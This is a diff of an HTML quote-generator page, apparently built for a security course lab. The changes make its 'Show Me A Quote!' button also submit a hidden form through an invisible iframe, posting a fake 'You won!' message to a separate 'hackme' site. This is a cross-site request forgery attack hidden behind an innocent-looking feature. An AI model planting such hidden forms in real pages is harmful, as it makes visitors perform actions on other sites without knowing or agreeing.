@@ -88,14 +88,13 @@ body{
       <!--end quoteContainer-->
 
       <div id="buttonContainer">
-			<input id="quoteButton" name="post_submit" type="button" value="Show Me A Quote!">
-				<iframe src="http://infosec-020-105/hackme-personal/post.php?" style="display: none;" name="myframe" id="myframe">
-					<form target="myframe" action="http://infosec-020-105/hackme-personal/post.php?" id="submission" method="post">
-							<input name="post_submit" value="set" type="hidden">
-							<input name="title" value="You won!" type="hidden">
-							<input name="message" value="You have been selected for a free flying dragon ride." type="hidden">
-					</form>
-				</iframe>
+        <form target="myframe" action="http://infosec-020-105/hackme-personal/post.php?" id="submission" method="post">
+						<input name="post_submit" value="set" type="hidden">
+						<input name="title" value="You won!" type="hidden">
+						<input name="message" value="You have been selected for a free flying dragon ride." type="hidden">
+            <input id="quoteButton" name="post_submit" type="button" value="Show Me A Quote!">
+        </form>
+				<iframe src="http://infosec-020-105/hackme-personal/post.php?" style="display: none;" name="myframe" id="myframe"></iframe>
       </div>
       <!--end buttonContainer-->
 
@@ -106,8 +105,8 @@ body{
 //These JS functions probably aren't necessary, and I'm probably doing this the long way.
 //But eh. It works. :P
   $('#submission').submit(function(event) {
-		alert('ok');
-		return true;
+      // submit the form
+      //event.preventDefault();
   });
 
     $(document).ready(function(){
@@ -213,7 +212,7 @@ body{
 
 
   $('#quoteButton').click(function(evt){
-		$('#submission').submit();
+		$('#submission').submit()
     //define the containers of the info we target
     var quote = $('#quoteContainer p').text();
     var quoteGenius = $('#quoteGenius').text();
